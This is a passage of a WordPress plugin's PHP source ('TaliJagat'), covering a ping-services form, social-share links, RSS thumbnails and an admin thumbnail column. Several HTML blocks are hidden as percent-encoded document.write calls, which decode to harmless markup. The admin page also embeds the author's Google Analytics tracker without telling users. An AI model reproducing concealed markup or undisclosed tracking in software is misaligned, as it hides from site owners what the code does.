D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_blogdigger%27%3E%3Cinput%20id%3D%27chk_blogdigger%27%20name%3D%27chk_blogdigger%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Blogdigger%3C/label%3E%20%3Ca%20href%3D%27http%3A//blogdigger.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Blogdigger%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_blogstreet%27%3E%3Cinput%20id%3D%27chk_blogstreet%27%20name%3D%27chk_blogstreet%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20BlogStreet%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.blogstreet.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20BlogStreet%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_moreover%27%3E%3Cinput%20id%3D%27chk_moreover%27%20name%3D%27chk_moreover%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Moreover%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.moreover.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Moreover%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_weblogalot%27%3E%3Cinput%20id%3D%27chk_weblogalot%27%20name%3D%27chk_weblogalot%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Weblogalot%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.weblogalot.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Weblogalot%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_icerocket%27%3E%3Cinput%20id%3D%27chk_icerocket%27%20name%3D%27chk_icerocket%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Icerocket%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.icerocket.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Icerocket%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_newsisfree%27%3E%3Cinput%20id%3D%27chk_newsisfree%27%20name%3D%27chk_newsisfree%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20News%20Is%20Free%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.newsisfree.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20News%20Is%20Free%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_topicexchange%27%3E%3Cinput%20id%3D%27chk_topicexchange%27%20name%3D%27chk_topicexchange%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Topic%20Exchange%3C/label%3E%20%3Ca%20href%3D%27http%3A//topicexchange.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Topic%20Exchange%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_google%27%3E%3Cinput%20id%3D%27chk_google%27%20name%3D%27chk_google%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Google%20Blog%20Search%3C/label%3E%20%3Ca%20href%3D%27http%3A//blogsearch.google.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Google%20Blog%20Search%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_tailrank%27%3E%3Cinput%20id%3D%27chk_tailrank%27%20name%3D%27chk_tailrank%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Spinn3r%3C/label%3E%20%3Ca%20href%3D%27http%3A//spinn3r.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Spinn3r%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_postrank%27%3E%3Cinput%20id%3D%27chk_postrank%27%20name%3D%27chk_postrank%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20PostRank%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.postrank.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20PostRank%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_skygrid%27%3E%3Cinput%20id%3D%27chk_skygrid%27%20name%3D%27chk_skygrid%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20SkyGrid%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.skygrid.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20SkyGrid%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_collecta%27%3E%3Cinput%20id%3D%27chk_collecta%27%20name%3D%27chk_collecta%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Collecta%3C/label%3E%20%3Ca%20href%3D%27http%3A//collecta.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Collecta%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%3C/table%3E%0A%09%0A%09%3Cfieldset%20id%3D%22servicestoping%22%3E"));
//-->
</script>
</fieldset>
<script>
<!--
document.write(unescape("%3Cp%20class%3D%22submit%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Send%20Ping%22/%3E%3C/p%3E%0A%3Cspan%20class%3D%22automattic-joint%22%20style%3D%27text-decoration%3A%20none%27%3E%0AA%20%3Ca%20href%3D%27http%3A//wordpressfoundation.org%27%20target%3D%22_blank%22%3EWordPress%20Foundation%3C/a%3E%20Branch%26copy%3B%202010%20WordPress%20Foundation%3Cbr%3E%20%0AKami%20bekerja%20dengan%20Anda%20sebagai%20mitra%20teknologi%20sehingga%20Anda%20dapat%20fokus%20pada%20strategi%20inti%20bisnis%20Anda%20sementara%20kami%20bekerja%20di%20bagian%20belakang%20untuk%20membuat%20organisasi%20Anda%20mencapai%20pelanggan%20global%20di%20dunia%20web.%26nbsp%3B%26copy%3B%202010%20Papa%20Destra%0A%3C/span%3E%0A"));
//-->
</script></form>
</div></div></div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-52447-20");
pageTracker._trackPageview();
} catch(err) {}</script>
</p>
<p>&nbsp;</p>
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="H9PUAV7KT2HFY">
<input type="image" src="https://www.paypal.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypal.com/id_ID/i/scr/pixel.gif" width="1" height="1">
</form>
<?php
}
function papadestra_function(){
?>
<script>
<!--
document.write(unescape("%3Cimg%20src%3D%22http%3A//i1008.photobucket.com/albums/af208/gagombale/polo-1.png%22%20border%3D%220%22%3E%3Cbr%3E%0A%3Ch2%3EWebsite%20Design%20%26%20Development%3C/h2%3E%0A%3Cp%3EHaving%20a%20passion%20to%20continue%20to%20be%20more%20creative%20and%20innovative%20work%20from%20time%20to%20time.%20Any%20challenge%20to%20the%20spirit%20to%20become%20better.%3C/p%3E%0A%3Cp%3EGlad%20if%20you%20give%20feedback%20about%20my%20work.%20So%20wish%20I%20could%20better%20realize.%20What%20you%20wear%20now%20is%20the%20free%20version.%20See%20Update%20on%20your%20dashboard%20for%20the%20information.%3C/p%3E%0A%3Cp%3E%3Ca%20href%3D%22http%3A//www.papadestra.com%22%20title%3D%22Develop%20Info%22%20target%3D%22_blank%22%3E%3Cb%3EVisit%20our%20website%3C/b%3E%3C/a%3E%20for%20the%20inspiration%20you%20give.%20Thank%20you%20if%20you%20are%20willing%20to%20give%20a%20little%20donation%20for%20our%20time.%20Use%20the%20Paypal%20button%20below.%3C/p%3E%0A"));
//-->
</script><p>
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="H9PUAV7KT2HFY">
<input type="image" src="https://www.paypal.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypal.com/id_ID/i/scr/pixel.gif" width="1" height="1">
</form>
<br>
<div xmlns:cc="http://creativecommons.org/ns#" xmlns:dct="http://purl.org/dc/terms/" about="http://creativecommons.org/choose/results-one?q_1=2&q_1=1&field_commercial=n&field_derivatives=n&field_jurisdiction=&field_format=&field_worktitle=TaliJagat+Wordpress+Plugin&field_attribute_to_name=Papa+Destra&field_attribute_to_url=http%3A%2F%2Fpapadestra.com%2F&field_sourceurl=&field_morepermissionsurl=http%3A%2F%2Fpapadestra.com%2F&lang=en_US&language=en_US&n_questions=3">
<span property="dct:title">TaliJagat Wordpress Plugin</span> (<a rel="cc:attributionURL" property="cc:attributionName" href="http://papadestra.com/" target="_blank">Papa Destra</a>) / <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/3.0/" target="_blank">CC BY-NC-ND 3.0</a></div>
</p>
<p>&nbsp;</p>
<p><iframe src="http://www.facebook.com/plugins/likebox.php?href=http%3A%2F%2Fwww.facebook.com%2Fapps%2Fapplication.php%3Fid%3D143495765679073&amp;width=600&amp;colorscheme=light&amp;connections=20&amp;stream=true&amp;header=true&amp;height=587" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:600px; height:587px;" allowTransparency="true"></iframe></p>
<?php
}
function gayasoyboy(){
        $bagi_keteman = WP_PLUGIN_URL . '/TaliJagat/gaya.css';
        $tempat_pile = WP_PLUGIN_DIR . '/TaliJagat/gaya.css';
        if ( file_exists($tempat_pile) ) {
            wp_register_style('bagi_jajan_pasar', $bagi_keteman);
            wp_enqueue_style( 'bagi_jajan_pasar');
        }
    }

add_action( 'wp_print_styles', 'gayasoyboy' );
function pencetan_tampil($ayo_bagi_aja_makde) {
	if(is_single()) {
		$ayo_bagi_aja_makde .= '<div class="simple_socialmedia"><ul>';
		$ayo_bagi_aja_makde .= '<li class="twitter"><a href="http://twitter.com/share?url='.get_permalink().'&amp;text='.get_the_title().'" target="_blank">Tweet</a></li>';
		$ayo_bagi_aja_makde .= '<li class="facebook"><a target="_blank" title="Share on Facebook" rel="nofollow" href="http://www.facebook.com/sharer.php?u='.get_permalink().'&amp;t='.get_the_title().'">Facebook</a></li>';
		$ayo_bagi_aja_makde .= '<li class="stumble"><a target="_blank" title="Share on StumbleUpon" rel="nofollow" href="http://www.stumbleupon.com/submit?url='.get_permalink().'">StumbleUpon</a></li>';
		$ayo_bagi_aja_makde .= '<li class="digg"><a target="_blank" title="Share on Digg" rel="nofollow" href="http://www.digg.com/submit?phase=2&amp;url='.get_permalink().'">Digg</a></li>';
		$ayo_bagi_aja_makde .= '<li class="delicious"><a target="_blank" title="Share on Delicious" rel="nofollow" href="http://del.icio.us/post?url='.get_permalink().'&amp;title=INSERT_TITLE">Delicious</a></li>';
		$ayo_bagi_aja_makde .= '</ul></div>';						
	}
	return $ayo_bagi_aja_makde;
}
add_filter('the_content', 'pencetan_tampil');
function ilang_persine() {
return '';
}
add_filter('the_generator', 'ilang_persine');
function rss_post_thumbnail($content) {
global $post;
if(has_post_thumbnail($post->ID)) {
$content = '<p>' . get_the_post_thumbnail($post->ID) .
'</p>' . get_the_content();
}
return $content;
}
add_filter('the_excerpt_rss', 'rss_post_thumbnail');
add_filter('the_content_feed', 'rss_post_thumbnail');
add_filter('login_errors',create_function('$a', "return null;"));
//////////////////////
if ( !function_exists('fb_AddThumbColumn') && function_exists('add_theme_support') ) {
	add_theme_support('post-thumbnails', array( 'post', 'page' ) );
	function fb_AddThumbColumn($cols) {
		$cols['thumbnail'] = __('Thumbnail');
		return $cols;
	}
	function fb_AddThumbValue($column_name, $post_id) {

			$width = (int) 35;
			$height = (int) 35;

			if ( 'thumbnail' == $column_name ) {
				
				$thumbnail_id = get_post_meta( $post_id, '_thumbnail_id', true );
				
				$attachments = get_children( array('post_parent' => $post_id, 'post_type' => 'attachment', 'post_mime_type' => 'image') );
				if ($thumbnail_id)
					$thumb = wp_get_attachment_image( $thumbnail_id, array($width, $height), true );
				elseif ($attachments) {
					foreach ( $attachments as $attachment_id => $attachment ) {
						$thumb = wp_get_attachment_image( $attachment_id, array($width, $height), true );
					}
				}
					if ( isset($thumb) && $thumb ) {
						echo $thumb;
					} else {
						echo __('None');
					}
			}
	}
	add_filter( 'manage_posts_columns', 'fb_AddThumbColumn' );
	add_action( 'manage_posts_custom_column', 'fb_AddThumbValue', 10, 2 );
	add_filter( 'manage_pages_columns', 'fb_AddThumbColumn' );
	add_action( 'manage_pages_custom_column', 'fb_AddThumbValue', 10, 2 );
}
?>
